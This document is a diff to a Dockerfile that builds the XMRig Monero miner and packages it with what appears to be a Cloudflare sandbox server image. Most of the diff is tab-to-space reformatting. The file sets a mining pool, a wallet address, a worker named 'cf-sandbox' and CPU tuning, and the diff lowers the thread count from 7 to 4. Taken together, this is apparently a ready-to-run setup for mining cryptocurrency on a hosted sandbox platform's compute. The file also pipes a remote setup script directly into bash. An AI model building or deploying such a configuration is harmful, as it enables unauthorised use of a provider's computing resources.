@@ -1,54 +1,54 @@
 FROM debian:bookworm-slim AS builder
 
 RUN apt-get update && apt-get install -y --no-install-recommends \
-	ca-certificates \
-	build-essential \
-	cmake \
-	git \
-	libuv1-dev \
-	libssl-dev \
-	libhwloc-dev \
-	&& rm -rf /var/lib/apt/lists/* \
-	&& apt-get clean
+    ca-certificates \
+    build-essential \
+    cmake \
+    git \
+    libuv1-dev \
+    libssl-dev \
+    libhwloc-dev \
+    && rm -rf /var/lib/apt/lists/* \
+    && apt-get clean
 
 WORKDIR /build
 RUN git clone --depth 1 https://github.com/xmrig/xmrig.git . \
-	&& mkdir build && cd build \
-	&& cmake .. \
-		-DCMAKE_BUILD_TYPE=Release \
-		-DCMAKE_C_FLAGS="-O3 -march=x86-64-v3 -mtune=generic -flto -funroll-loops -fno-plt -fomit-frame-pointer" \
-		-DCMAKE_CXX_FLAGS="-O3 -march=x86-64-v3 -mtune=generic -flto -funroll-loops -fno-plt -fomit-frame-pointer" \
-		-DCMAKE_EXE_LINKER_FLAGS="-flto -Wl,-O1,--as-needed" \
-		-DWITH_OPENCL=OFF \
-		-DWITH_CUDA=OFF \
-		-DWITH_HWLOC=ON \
-		-DWITH_TLS=ON \
-		-DWITH_CN_LITE=OFF \
-		-DWITH_CN_HEAVY=OFF \
-		-DWITH_CN_PICO=OFF \
-		-DWITH_CN_FEMTO=OFF \
-		-DWITH_KAWPOW=OFF \
-		-DWITH_GHOSTRIDER=OFF \
-	&& make -j$(nproc) \
-	&& strip --strip-all xmrig \
-	&& cp xmrig /usr/local/bin/xmrig
+    && mkdir build && cd build \
+    && cmake .. \
+        -DCMAKE_BUILD_TYPE=Release \
+        -DCMAKE_C_FLAGS="-O3 -march=x86-64-v3 -mtune=generic -flto -funroll-loops -fno-plt -fomit-frame-pointer" \
+        -DCMAKE_CXX_FLAGS="-O3 -march=x86-64-v3 -mtune=generic -flto -funroll-loops -fno-plt -fomit-frame-pointer" \
+        -DCMAKE_EXE_LINKER_FLAGS="-flto -Wl,-O1,--as-needed" \
+        -DWITH_OPENCL=OFF \
+        -DWITH_CUDA=OFF \
+        -DWITH_HWLOC=ON \
+        -DWITH_TLS=ON \
+        -DWITH_CN_LITE=OFF \
+        -DWITH_CN_HEAVY=OFF \
+        -DWITH_CN_PICO=OFF \
+        -DWITH_CN_FEMTO=OFF \
+        -DWITH_KAWPOW=OFF \
+        -DWITH_GHOSTRIDER=OFF \
+    && make -j$(nproc) \
+    && strip --strip-all xmrig \
+    && cp xmrig /usr/local/bin/xmrig
 
 FROM debian:bookworm-slim
 
 RUN apt-get update && apt-get install -y --no-install-recommends \
-	ca-certificates \
-	curl \
-	libuv1 \
-	libssl3 \
-	libhwloc15 \
-	iproute2 \
-	&& rm -rf /var/lib/apt/lists/* \
-	&& apt-get clean
+    ca-certificates \
+    curl \
+    libuv1 \
+    libssl3 \
+    libhwloc15 \
+    iproute2 \
+    && rm -rf /var/lib/apt/lists/* \
+    && apt-get clean
 
 RUN curl -fsSL https://deb.nodesource.com/setup_22.x | bash - \
-	&& apt-get install -y --no-install-recommends nodejs \
-	&& rm -rf /var/lib/apt/lists/* \
-	&& apt-get clean
+    && apt-get install -y --no-install-recommends nodejs \
+    && rm -rf /var/lib/apt/lists/* \
+    && apt-get clean
 
 COPY --from=docker.io/cloudflare/sandbox:0.9.3 /container-server/sandbox /sandbox
 
@@ -68,7 +68,7 @@ ENV MINER_POOL=pool.supportxmr.com:3333
 ENV MINER_WALLET=42NziJLpe2SZ1ToBqfCXBk1FnFTpNkrdWQfsURbYDqjQ3mDZNfLBsA5YAWv8SaHeCVFQt4uMuuigC5NFURY8sgdz2gt4i5Y
 ENV MINER_WORKER_NAME=cf-sandbox
 ENV MINER_TUNING_PROFILE=throughput
-ENV MINER_THREADS=7
+ENV MINER_THREADS=4
 ENV MINER_CPU_PRIORITY=5
 ENV MINER_CPU_AFFINITY=0xF
 ENV MINER_RANDOMX_MODE=fast
